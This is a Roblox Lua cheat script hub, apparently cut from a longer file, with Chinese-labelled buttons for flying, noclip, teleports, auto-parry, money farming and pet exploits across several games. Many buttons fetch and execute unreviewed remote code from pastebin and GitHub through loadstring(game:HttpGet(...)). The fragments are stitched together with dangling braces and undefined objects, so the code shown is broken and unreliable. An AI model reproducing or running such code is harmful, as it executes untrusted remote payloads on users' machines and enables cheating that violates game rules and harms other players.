
local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")

--Properties:

main.Name = "main"
main.Parent = game.CoreGui
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "向上"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "向上"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "向下"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "向下"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "乐迪起飞了！"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "繁星🚔"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "乐迪加速"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "乐迪坠机"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.LowerTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	





end)


up.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,0)
	
end)


down.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-2,0)

end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then
		

	tpwalking = false
	for i = 1, speeds do
		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	


			tpwalking = true
			local chr = game.Players.LocalPlayer.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
			while tpwalking and hb:Wait() and chr and hum and hum.Parent do
				if hum.MoveDirection.Magnitude > 0 then
					chr:TranslateBy(hum.MoveDirection)
				end
			end

		end)
		end
		end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'can not be less than 1'
		wait(1)
		speed.Text = speeds
	else
	speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
	tpwalking = false
	for i = 1, speeds do
		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	


			tpwalking = true
			local chr = game.Players.LocalPlayer.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
			while tpwalking and hb:Wait() and chr and hum and hum.Parent do
				if hum.MoveDirection.Magnitude > 0 then
					chr:TranslateBy(hum.MoveDirection)
				end
			end

		end)
		end
		end
		end
end)
end)

tool:Button("工具包",function()
        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
end)

tool:Button("穿墙",function(Value)
        if Value then
      Noclip = true
      Stepped = game.RunService.Stepped:Connect(function()
        if Noclip == true then
          for a, b in pairs(game.Workspace:GetChildren()) do
            if b.Name == game.Players.LocalPlayer.Name then
              for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                  v.CanCollide = false
                end
              end
            end
          end
         else
          Stepped:Disconnect()
        end
      end)
     else
      Noclip = false
    end
end)

tool:Button("飞车",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
end)

tool:Button("无限跳",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
end)

tool:Button("1×1×1",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))()
end)

tool:Button("跑墙",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

local creds = window:Tab("DOORS",'6035145364')

local tool = creds:section("功能",true)

tool:Button("screech抱枕 pss~",function()
        print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/iRvZnnke'))()
end)

tool:Button("穿墙",function()
        loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
end)

tool:Toggle("夜视",function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
end)

tool:Button("手电筒",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
end)

tool:Button("神圣炸弹",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/HolyGrenadeByNerd.lua"))()
end)

tool:Button("每一道门闪灯",function()
        local Data = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game)
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
        firesignal(game.ReplicatedStorage.Bricks.UseEventModule.OnClientEvent, "flickerLights", game.ReplicatedStorage.GameData.LatestRoom.Value, 1) 
        end)
end)

tool:Button("每一道门心跳小游戏",function()
        local Data = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game)
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
        firesignal(game.ReplicatedStorage.Bricks.ClutchHeartbeat.OnClientEvent) 
        end)
end)

tool:Button("SC十字架",function()
loadstring(game:HttpGet("https://pastebin.com/raw/W1AzELhb"))()
end)

tool:Button("十字架封印一切按q使用",function()
        _G.Uses = 10000
_G.Range = 999
_G.OnAnything = true
_G.Fail = false
loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))()
end)

local creds = window:Tab("刀刃球",'6035145364')

local tool = creds:section("功能",true)

tool:Button("自动格挡",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
end)

local creds = window:Tab("BF",'6035145364')

local tool = creds:section("功能",true)

tool:Button("刷钱（会假被踢重进就行）",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Chest_onoff"))()
end)

local creds = window:Tab("监狱人生",'6035145364')

local tool = creds:section("功能（传送）",true)

tool:Button("（警卫室）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(847.7261352539062, 98.95999908447266, 2267.387451171875)
end)
tool:Button("（监狱内）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.2575073242188, 98.95999908447266, 2379.74169921875)
end)
tool:Button("（罪犯复活点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-937.5891723632812, 93.09876251220703, 2063.031982421875)
end)
tool:Button("（监狱外）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(760.6033325195312, 96.96992492675781, 2475.405029296875)
end)
local creds = window:Tab("忍者传奇",'6035145364')

local tool = creds:section("功能（传送）",true)
tool:Button("（出生点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(25.665502548217773, 3.4228405952453613, 29.919952392578125)
end)
tool:Button("（附魔岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51.17238235473633, 766.1807861328125, -138.44842529296875)
end)
tool:Button("（神秘岛）",function()
        		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(171.97178649902344, 4047.380859375, 42.0699577331543)
end)
tool:Button("（太空岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.83824157714844, 5657.18505859375, 73.5014877319336)
end)
tool:Button("（冻土岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139.28330993652344, 9285.18359375, 77.36406707763672)
end)
tool:Button("（永恒岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(149.34817504882812, 13680.037109375, 73.3861312866211)
end)
tool:Button("（沙暴岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(133.37144470214844, 17686.328125, 72.00334167480469)
end)
tool:Button("（雷暴岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.19349670410156, 24070.021484375, 78.05432891845703)
end)
tool:Button("（远古炼狱岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.27163696289062, 28256.294921875, 69.3790283203125)
end)
tool:Button("（午夜暗影岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(132.74267578125, 33206.98046875, 57.495574951171875)
end)
tool:Button("（神秘灵魂岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.76148986816406, 39317.5703125, 61.06639862060547)
end)
tool:Button("（冬季岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.2720184326172, 46010.5546875, 55.941951751708984)
end)
tool:Button("（黄金大师岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(128.32339477539062, 52607.765625, 56.69411849975586)
end)
tool:Button("（龙传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(146.35226440429688, 59594.6796875, 77.53300476074219)
end)
tool:Button("（赛博传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.3321075439453, 66669.1640625, 72.21722412109375)
end)
tool:Button("（天岚超能岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.48077392578125, 70271.15625, 57.02311325073242)
end)
tool:Button("（混沌传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.58590698242188, 74442.8515625, 69.3177719116211)
end)

local tool = creds:section("功能（传送）2",true)
tool:Button("（黑暗元素岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.697265625, 83198.984375, 72.73107147216797)
end)
tool:Button("（内心和平岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.3157501220703, 87051.0625, 66.78429412841797)
end)
tool:Button("（漩涡炽热岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.08216857910156, 91246.0703125, 69.56692504882812)
end)
local tool = creds:section("功能（传送）2",true)
tool:Button("（快捷＜超多功能>）",function()
        	local ada=Instance.new("ScreenGui")
local bda=Instance.new("Frame")local cda=Instance.new("TextButton")
local dda=Instance.new("TextButton")local __b=Instance.new("TextButton")
local a_b=Instance.new("TextButton")local b_b=Instance.new("TextButton")
local c_b=Instance.new("TextButton")local d_b=Instance.new("TextButton")
local _ab=Instance.new("TextButton")local aab=Instance.new("TextButton")
local bab=Instance.new("TextButton")local cab=Instance.new("TextButton")
local dab=Instance.new("TextButton")local _bb=Instance.new("TextButton")
local abb=Instance.new("TextButton")local bbb=Instance.new("TextButton")
local cbb=Instance.new("TextButton")local dbb=Instance.new("TextButton")
local _cb=Instance.new("TextButton")local acb=Instance.new("TextButton")
local bcb=Instance.new("TextButton")local ccb=Instance.new("TextLabel")
ada.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")bda.Parent=ada;bda.BackgroundColor3=Color3.new(1,1,1)
bda.BorderSizePixel=4;bda.Position=UDim2.new(0.19525066,0,0.497435898,0)
bda.Size=UDim2.new(0,504,0,304)cda.Parent=bda
cda.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cda.BorderColor3=Color3.new(0.0627451,0.501961,0.00392157)cda.BorderSizePixel=3
cda.Position=UDim2.new(0.0218253974,0,0.914473712,0)cda.Size=UDim2.new(0,65,0,18)
cda.Font=Enum.Font.GothamBold;cda.Text="重置"cda.TextColor3=Color3.new(0,0,0)
cda.TextSize=18;dda.Parent=bda
dda.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dda.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dda.BorderSizePixel=3
dda.Position=UDim2.new(0.174603179,0,0.914473712,0)dda.Size=UDim2.new(0,106,0,21)
dda.Font=Enum.Font.GothamBold;dda.Text="自动坏人"dda.TextColor3=Color3.new(0,0,0)
dda.TextSize=14;__b.Parent=bda
__b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
__b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)__b.BorderSizePixel=3
__b.Position=UDim2.new(0.412698418,0,0.917763174,0)__b.Size=UDim2.new(0,42,0,21)
__b.Font=Enum.Font.GothamBold;__b.Text="OFF"__b.TextColor3=Color3.new(0,0,0)__b.TextSize=14
a_b.Parent=bda
a_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
a_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)a_b.BorderSizePixel=3
a_b.Position=UDim2.new(0.521825373,0,0.914473712,0)a_b.Size=UDim2.new(0,106,0,21)
a_b.Font=Enum.Font.GothamBold;a_b.Text="自动好人"a_b.TextColor3=Color3.new(0,0,0)
a_b.TextSize=14;b_b.Parent=bda
b_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
b_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)b_b.BorderSizePixel=3
b_b.Position=UDim2.new(0.759920597,0,0.917763174,0)b_b.Size=UDim2.new(0,42,0,21)
b_b.Font=Enum.Font.GothamBold;b_b.Text="OFF"b_b.TextColor3=Color3.new(0,0,0)b_b.TextSize=14
c_b.Parent=bda
c_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
c_b.BorderColor3=Color3.new(0.0627451,0.501961,0.00392157)c_b.BorderSizePixel=3
c_b.Position=UDim2.new(0.0238095243,0,0.802631557,0)c_b.Size=UDim2.new(0,65,0,18)
c_b.Font=Enum.Font.GothamBold;c_b.Text="最大JP"c_b.TextColor3=Color3.new(0,0,0)
c_b.TextSize=18;d_b.Parent=bda
d_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
d_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)d_b.BorderSizePixel=3
d_b.Position=UDim2.new(0.174603179,0,0.799342096,0)d_b.Size=UDim2.new(0,106,0,21)
d_b.Font=Enum.Font.GothamBold;d_b.Text="无限隐身"d_b.TextColor3=Color3.new(0,0,0)
d_b.TextSize=14;_ab.Parent=bda
_ab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_ab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_ab.BorderSizePixel=3
_ab.Position=UDim2.new(0.521825373,0,0.799342096,0)_ab.Size=UDim2.new(0,106,0,21)
_ab.Font=Enum.Font.GothamBold;_ab.Text="解锁所有岛屿"_ab.TextColor3=Color3.new(0,0,0)
_ab.TextSize=14;aab.Parent=bda
aab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
aab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)aab.BorderSizePixel=3
aab.Position=UDim2.new(0.176587299,0,0.684210539,0)aab.Size=UDim2.new(0,106,0,21)
aab.Font=Enum.Font.GothamBold;aab.Text="删除通知"aab.TextColor3=Color3.new(0,0,0)
aab.TextSize=10;bab.Parent=bda
bab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bab.BorderSizePixel=3
bab.Position=UDim2.new(0.521825373,0,0.684210539,0)bab.Size=UDim2.new(0,106,0,21)
bab.Font=Enum.Font.GothamBold;bab.Text="大领袖全部"bab.TextColor3=Color3.new(0,0,0)
bab.TextSize=14;cab.Parent=bda
cab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)cab.BorderSizePixel=3
cab.Position=UDim2.new(0.0297619049,0,0.575657904,0)cab.Size=UDim2.new(0,106,0,21)
cab.Font=Enum.Font.GothamBold;cab.Text="自动摆剑"cab.TextColor3=Color3.new(0,0,0)
cab.TextSize=15;dab.Parent=bda
dab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dab.BorderSizePixel=3
dab.Position=UDim2.new(0.267857134,0,0.575657904,0)dab.Size=UDim2.new(0,106,0,21)
dab.Font=Enum.Font.GothamBold;dab.Text="自动出售"dab.TextColor3=Color3.new(0,0,0)
dab.TextSize=15;_bb.Parent=bda
_bb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_bb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_bb.BorderSizePixel=3
_bb.Position=UDim2.new(0.509920657,0,0.575657904,0)_bb.Size=UDim2.new(0,106,0,21)
_bb.Font=Enum.Font.GothamBold;_bb.Text="自动全额出售"_bb.TextColor3=Color3.new(0,0,0)
_bb.TextSize=15;abb.Parent=bda
abb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
abb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)abb.BorderSizePixel=3
abb.Position=UDim2.new(0.75,0,0.575657904,0)abb.Size=UDim2.new(0,106,0,21)
abb.Font=Enum.Font.GothamBold;abb.Text="快摆"abb.TextColor3=Color3.new(0,0,0)
abb.TextSize=15;bbb.Parent=bda
bbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bbb.BorderSizePixel=3
bbb.Position=UDim2.new(0.0317460336,0,0.450657904,0)bbb.Size=UDim2.new(0,106,0,21)
bbb.Font=Enum.Font.GothamBold;bbb.Text="机器人攻击"bbb.TextColor3=Color3.new(0,0,0)
bbb.TextSize=15;cbb.Parent=bda
cbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)cbb.BorderSizePixel=3
cbb.Position=UDim2.new(0.267857134,0,0.453947365,0)cbb.Size=UDim2.new(0,106,0,21)
cbb.Font=Enum.Font.GothamBold;cbb.Text="永恒攻击"cbb.TextColor3=Color3.new(0,0,0)
cbb.TextSize=15;dbb.Parent=bda
dbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dbb.BorderSizePixel=3
dbb.Position=UDim2.new(0.511904776,0,0.450657904,0)dbb.Size=UDim2.new(0,106,0,21)
dbb.Font=Enum.Font.GothamBold;dbb.Text="自动跳圈"dbb.TextColor3=Color3.new(0,0,0)
dbb.TextSize=15;_cb.Parent=bda
_cb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_cb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_cb.BorderSizePixel=3
_cb.Position=UDim2.new(0.75,0,0.447368413,0)_cb.Size=UDim2.new(0,106,0,21)
_cb.Font=Enum.Font.GothamBold;_cb.Text="自动升级宠物"_cb.TextColor3=Color3.new(0,0,0)
_cb.TextSize=15;acb.Parent=bda
acb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
acb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)acb.BorderSizePixel=3
acb.Position=UDim2.new(0.0317460336,0,0.338815778,0)acb.Size=UDim2.new(0,106,0,21)
acb.Font=Enum.Font.GothamBold;acb.Text="无限宠物"acb.TextColor3=Color3.new(0,0,0)
acb.TextSize=15;bcb.Parent=bda
bcb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bcb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bcb.BorderSizePixel=3
bcb.Position=UDim2.new(0.271825403,0,0.342105269,0)bcb.Size=UDim2.new(0,106,0,21)
bcb.Font=Enum.Font.GothamBold;bcb.Text="宠物故障"bcb.TextColor3=Color3.new(0,0,0)
bcb.TextSize=15;ccb.Parent=bda;ccb.BackgroundColor3=Color3.new(1,1,1)
ccb.BackgroundTransparency=1
ccb.Position=UDim2.new(-0.242063493,0,-0.016447369,0)ccb.Size=UDim2.new(0,753,0,50)
ccb.Font=Enum.Font.GothamBold;ccb.Text="繁星忍者传奇"
ccb.TextColor3=Color3.new(0,0,0)ccb.TextSize=35;ccb.TextWrapped=true;local function dcb()
local acc=Instance.new('LocalScript',ada)frame=acc.Parent.Frame;frame.Draggable=true;frame.Active=true
frame.Selectable=true end
coroutine.wrap(dcb)()
local function _db()local acc=Instance.new('LocalScript',bda)
while true do
acc.Parent.BackgroundColor3=Color3.fromRGB(157,255,198)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(108,255,243)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(103,169,255)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(123,97,255)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(214,90,255)wait(0.1)
